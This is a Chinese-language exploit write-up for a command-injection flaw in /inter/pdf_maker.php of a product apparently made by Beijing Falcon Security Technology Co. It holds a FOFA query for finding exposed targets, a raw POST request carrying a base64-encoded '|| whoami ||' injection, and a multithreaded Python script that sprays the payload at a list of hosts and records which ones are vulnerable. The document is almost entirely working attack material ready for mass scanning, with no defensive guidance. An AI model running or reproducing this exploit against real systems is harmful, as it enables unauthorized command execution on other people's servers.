## 漏洞概述

漏洞位置

废物洞

```bash
/inter/pdf_maker.php
```

## 影响范围

```http
版本：V8
FOFA:body="北京猎鹰安全科技有限公司"
```

## POC

```http
POST /inter/pdf_maker.php HTTP/1.1
Host: xxxxxxxxx
Content-Length: 45
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer:
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: PHPSESSID=750mnuf7f29e6dpsrp27r2p7o6
Upgrade-Insecure-Requests: 1

url=Inx8IHdob2FtaSB8fA==&fileName=xxx
```

## EXP

```python
#conding=utf-8
import requests #用于http请求响应
from requests.packages import urllib3
import threading#用于并发请求

'''
使用方法：
urls.txt用于存放目标HOST，然后直接运行此脚本即可 python POC.py
漏洞验证成功的目标存放于success.txt，连接失败的错误信息存放于error.txt中
'''

#消除安全请求的提示信息,增加重试连接次数
urllib3.disable_warnings()
requests.adapters.DEFAULT_RETRIES = 1
s = requests.session()
s.keep_alive = False    #关闭连接，防止出现最大连接数限制错误
urllib3.util.ssl_.DEFAULT_CIPHERS += 'HIGH:!DH:!aNULL'#openssl 拒绝短键，防止SSL错误

# 设置最大线程数
thread_max = threading.BoundedSemaphore(value=150)

#HTTP请求-head头
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    'Content-Type': 'application/x-www-form-urlencoded',
}

targets = []    #定义目标列表
threads = []    #定义线程池

def POC(url):
    target = url + '/inter/pdf_maker.php'
    payload = "url=Inx8IHdob2FtaSB8fA==&fileName=xxx"
    try:
        resp = s.post(url=target, headers=headers, data=payload, verify=False, timeout=8)
        resp.encoding = resp.apparent_encoding  #apparent_encoding会从网页的内容中分析网页编码的方式
        if (resp.status_code ==200 and ("Windows" in resp.text)):
            print("目标 {} 存在漏洞".format(target))   
            success = url+" "+resp.text
            resp.close() #关闭响应包
            with open('success.txt','a') as f:
                f.write(url+'\n')
        else:
            pass
            print(url+"===>不存在漏洞！")

    except Exception as ex_poc:
        msg = url+"=====报错了====="+str(ex_poc)
        with open('./error.txt','a') as f:
            f.write(msg+'\n')
    finally:
        thread_max.release()    #释放锁


def H2U():
    '''输入格式处理，将HOST统一为URL格式'''
    with open('urls.txt','r',encoding='utf-8') as f:
        line=f.readlines()
        for host in line:
            host=host.strip()
            if(host[0:4]=="http"):
                url=host
            else:
                url="http://"+host
            if url not in targets:
                targets.append(url) #去重后加入目标列表


if __name__ == "__main__":
    H2U()
    for url in targets:
        thread_max.acquire()    #请求锁
        t = threading.Thread(target=POC,args=(url,))
        threads.append(t)
        t.start()
    for i in threads:
        i.join()
```

## 参考链接

https://mp.weixin.qq.com/s/eQtyY3B8jwVL_n0FaGpQlA